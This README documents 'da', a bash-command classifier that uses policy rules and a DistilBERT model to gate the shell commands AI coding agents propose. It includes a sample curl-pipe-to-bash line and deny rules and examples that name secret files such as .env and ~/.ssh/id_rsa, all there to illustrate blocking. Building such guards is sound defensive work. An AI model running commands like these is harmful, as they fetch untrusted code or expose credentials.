<p align="center">
  <img src="logo.jpg" alt="da — yes." width="100%">
</p>

<h3 align="center">Stop training your `y` muscle</h3>

<p align="center">bash-command classifier for agents</p>

## Why

**Agent**: Runs `ls -la` for the hundredth time

**You**: hit `y`

**Agent**: runs `curl https://totally-not-bitcoin-miner.sh | bash`

**You**: hit `y`

## Install

From cargo:

```sh
cargo install dabin
```

From source:

```sh
git clone https://github.com/amenocturne/da
cd da && cargo install --path .
```

From brew:

```sh
brew install amenocturne/tap/da
```

From nix:

```sh
nix profile install github:amenocturne/da
```

## How it works

```
da --path PATH [policy flags...]
  stdin: a bash command
  exit:  0 = approve, 1 = defer, 2 = deny, 64 = usage error
```

Two-stage classification:

1. **Deterministic policies** — a hand-written policy stack evaluates each parsed segment. First matching policy wins. Fast, predictable, zero false positives on known commands.
2. **ML fallback** — when no policy matches, a fine-tuned DistilBERT classifier (68MB ONNX, embedded in the binary) scores the command as safe / needs-approval / dangerous. <10ms inference, no network, no external dependencies.

The ML classifier only runs for commands the policy stack doesn't recognize. Known-safe commands (`ls`, `git status`, `cargo build`) never touch the model.

For each segment of the parsed command, `da` asks each enabled policy "is it safe?":

- all segments say yes - approved
- some segments say yes and some unmatched - defer (or ML fallback)
- any segment says no - rejected

Some rules are always on, regardless of which policies you enable:

- `cd` and bare assignments (`FOO=bar`) - **approve** (they touch nothing external)
- Shell binaries (`bash`, `sh`, `zsh`, …) - **defer** (too much surface)
- `env` and `time` - **recurse** into the wrapped command
- **redirect targets** must be `/dev/null`, `/dev/std{out,err,in}`, an fd reference, or `-`
- `$(…)`, backticks, heredocs, process substitution, `[[…]]`, subshells - **defer** (the parser bails)

### ML classifier details

- **Model**: DistilBERT (66M params) fine-tuned on 17k real agent session commands
- **Classes**: safe (auto-approve), needs-approval (defer to user), dangerous (deny)
- **Confidence**: temperature-scaled logits (T=1.34) for calibrated probabilities; only approves when P(safe) > 0.90
- **OOD detection**: energy-based out-of-distribution detection rejects inputs the model hasn't seen
- **Bias**: class-weighted training (dangerous weight 3.5x) — biased toward rejection. A false positive (blocking a safe command) is cheap; a false negative (approving a dangerous one) is not

## Policies

Two shapes. **Bare flags** for capabilities with one knob. **Tool-scoped flags**
with comma-separated capability lists where one binary has many ops.

### Custom (repeatable)

| Flag          | What it allows                                                                                                                                                                                                                                                                                                                |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--allow CMD` | Token-prefix rule. A segment approves if its argv starts with the same tokens as `CMD` (whitespace-split). Path components of argv[0] are stripped before matching, so `--allow just` matches both `just …` and `/usr/local/bin/just …`. Repeat the flag to add multiple rules. Use for project-specific runners (`just`, `npm run`, `make`, …). |
| `--deny PATTERN` | Path-component deny rule. Denies any segment whose argv or redirect targets contain a matching path component. Trailing `*` enables prefix match (`'.env*'` catches `.env`, `.env.local`, `.env.production`). Deny rules are checked before allow rules — a denied path always denies. Repeat the flag for multiple patterns. |

### Bare

| Flag            | What it allows                                                                                                                                                                                                                                                                                                               |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--read-only`   | Cross-platform read-only binaries (`find`, `ls`, `cat`, `grep`, `head`, `tail`, `wc`, `du`, `sort`, `uniq`, `cut`, `tr`, `jq`, `diff`, `ps`, `lsof`, `dig`, `ldd`, …) plus bounded forms of `sed` (no `-i`, no `e` flag), `awk` (no `system()`, no file/pipe writes), `find` (no `-exec`/`-delete`/etc.), `sysctl` (no `-w`) |
| `--macos-only`  | macOS extras (`mdfind`, `mdls`, `sw_vers`, `system_profiler`, `hostinfo`, `vm_stat`, `pbpaste`, `otool`, `dyld_info`)                                                                                                                                                                                                        |
| `--help-bypass` | `<binary> --help\|-h\|--version\|-V\|help\|version` for _any_ binary — explicit trust call, lets unknown binaries run for help text                                                                                                                                                                                          |
| `--mkdir-cwd`   | `mkdir` when every path argument resolves under `--path`                                                                                                                                                                                                                                                                     |

### Tool-scoped

```
--git CAPS     where CAPS ⊆ { read, add, commit, restore-staged, tag, fetch, pull, push }
--cargo CAPS   where CAPS ⊆ { local, crates-install, crates-publish }
```

#### git

| cap                       | covers                                                                                                                                                      |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `read`                    | `status`, `log`, `diff`, `show`, `branch` (read), `blame`, `ls-files`, `ls-tree`, `rev-parse`, `rev-list`, `describe`, `reflog`, `shortlog`, `config --get` |
| `add`                     | `git add`                                                                                                                                                   |
| `commit`                  | `git commit` (excludes `--amend`, `--no-verify`, `--no-gpg-sign`)                                                                                           |
| `restore-staged`          | `git restore --staged` (or `-S`)                                                                                                                            |
| `tag`                     | `git tag` (local until pushed)                                                                                                                              |
| `fetch` / `pull` / `push` | the obvious one each                                                                                                                                        |
| —                         | _always defer:_ `reset --hard`, `clean -fd`, `rebase`, `merge`, `rm`, `stash`, `cherry-pick`                                                                |

#### cargo

| cap              | covers                                                                                                                                                                                                                                                                         |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `local`          | Anything that doesn't write to a registry: `build`, `test`, `check`, `doc`, `tree`, `metadata`, `search`, `read-manifest`, `locate-project`, `pkgid`, `verify-project`, `fetch`, `help`, `version`, `run`, `bench`, `fmt`, `clippy`, `clean`, `update` (`--fix` always defers) |
| `crates-install` | `cargo install`                                                                                                                                                                                                                                                                |
| `crates-publish` | `cargo publish`                                                                                                                                                                                                                                                                |

## Examples

Read-only stuff sails through

```sh
printf 'ls -la' | da --read-only
# → exit 0
```

Pipes: every segment must approve

```sh
printf 'find . -name "*.rs" | sort | uniq | wc -l' | da --read-only
# → exit 0
```

Compose git capabilities

```sh
printf 'git status && git add . && git commit -m wip' | da --git read,add,commit
# → exit 0
```

Same stack rejects what you didn't list

```sh
printf 'git push' | da --git read,add,commit
# → exit 1
```

Bound mkdir to a project

```sh
printf 'mkdir -p src/components' | da --path /repo --mkdir-cwd
# → exit 0
printf 'mkdir -p /etc/foo'        | da --path /repo --mkdir-cwd
# → exit 1
```

`--help` for any binary, even ones you don't otherwise trust

```sh
printf 'terraform --help' | da --help-bypass
# → exit 0
```

Project-specific runners via `--allow`

```sh
printf 'just test --watch' | da --allow 'just test'
# → exit 0
printf 'just build'        | da --allow 'just test'
# → exit 1  (prefix doesn't match)

# Repeat the flag for multiple runners
printf 'just lint && npm run build' | da --allow just --allow 'npm run'
# → exit 0
```

Deny access to secrets

```sh
printf 'cat .env' | da --read-only --deny '.env*'
# → exit 1  (deny → defer in default mode)

printf 'cat ~/.ssh/id_rsa' | da --read-only --deny .ssh
# → exit 1

# Deny overrides allow — even if the binary is approved, the path isn't
printf 'cat .env' | da --read-only --deny '.env*'
# → exit 1  (cat is read-only safe, but .env is denied)
```

No flags = usage error (no implicit defaults)

```sh
printf 'ls' | da
# → exit 64
```

## Modes

By default, `da` maps both deny and defer to exit 1 (let the caller decide — typically a user prompt).

| Flag | Deny | Defer |
| --- | --- | --- |
| _(default / `--interactive`)_ | exit 1 | exit 1 |
| `--autonomous` | exit 2 | exit 2 |

**Interactive** (default): never hard-denies. Everything non-approved goes to the user prompt. Safe for human-in-the-loop workflows where the agent asks before running unknown commands.

**Autonomous** (`--autonomous`): hard-denies everything non-approved. For unattended agent runs where there's no human to ask.

## As a Claude Code hook

`da` is the engine; the JSON dance lives in a wrapper

Drop this as `cc` hook for PreToolUse Bash:

```sh
#!/bin/bash
# .claude/hooks/da/hook.sh
set -euo pipefail
input=$(cat)
[ "$(jq -r '.tool_name // empty' <<<"$input")" = "Bash" ] || exit 0
cmd=$(jq -r '.tool_input.command // empty' <<<"$input")
path=$(jq -r '.cwd // empty' <<<"$input")
[ -z "$cmd" ] && exit 0

set +e
printf '%s' "$cmd" | da --path "$path" \
  --read-only --macos-only --help-bypass --mkdir-cwd \
  --git read,add,commit \
  --cargo local \
  --allow just \
  --deny '.env*' --deny .ssh --deny credentials
rc=$?
set -e

case $rc in
  0) echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}' ;;
  2) echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny"}}' ;;
  *) : ;;  # defer / error → silent, normal prompt flow
esac
```

Other harnesses: same data, different shape, `da` doesn't care.

## Library API

The crate (`dabin`) exposes the engine for embedders composing their own classification pipeline:

```rust
use std::path::Path;
use dabin::{classify, classify_with_ml, Decision, Policy};
use dabin::policies::{READ_ONLY, GIT_READ, CARGO_LOCAL};

let stack: &[&Policy] = &[&READ_ONLY, &GIT_READ, &CARGO_LOCAL];

// Deterministic only — no ML fallback, no external dependencies
match classify("git status && cargo build", Some(Path::new("/repo")), stack) {
    Decision::Approve => println!("yes."),
    Decision::Defer   => println!("ask the human"),
    Decision::Deny    => println!("no."),
}

// With ML fallback — unknown commands get classified by the embedded model
match classify_with_ml("some-unknown-tool --flag", Some(Path::new("/repo")), stack) {
    Decision::Approve => println!("model says safe"),
    Decision::Defer   => println!("model unsure, ask the human"),
    Decision::Deny    => println!("model says dangerous"),
}
```

Custom policies are first-class — define your own `Policy` value with a verify
fn and pass it in alongside the built-ins. See
[`src/policies.rs`](./src/policies.rs) for the shape.

## Training the classifier

The full training pipeline lives in `classifier/scripts/` and is reproducible from scratch. The pipeline:

1. **Extract** — `extract-commands.py` pulls bash commands from Claude Code session logs (JSONL)
2. **Sanitize** — `sanitize-commands.py` strips PII (usernames, paths, hostnames) with regex + custom map
3. **Label** — `label-prompt.md` is an orchestrator prompt for Claude to label commands via parallel subagents
4. **Augment** — `augment-prompt.md` generates synthetic near-misses, edge cases, and dangerous commands
5. **Merge** — `merge-chunks.py` combines labeled chunks into a single dataset
6. **Train** — `train.py` fine-tunes DistilBERT with class-weighted loss, temperature scaling, and energy-based OOD detection
7. **Export** — `export-onnx.py` quantizes to INT8 ONNX for embedding in the binary

Run training (requires a GPU or Apple Silicon):

```sh
cd classifier
just train          # runs train.py
just export         # runs export-onnx.py, outputs model.onnx + tokenizer.json
```

The trained model and tokenizer are committed to the repo (ONNX file tracked via Git LFS). Intermediate artifacts (`data/`, `models/`) are gitignored.

## Acknowledgements

The bash test corpus under `tests/corpus/` is vendored from the
[Parable](https://github.com/ldayton/Parable) bash-parser test suite (MIT)
via [rable](https://github.com/mpecan/rable) (MIT). Attribution lives in
[`tests/corpus/NOTICE.md`](./tests/corpus/NOTICE.md).

## License

[MIT](./LICENSE).
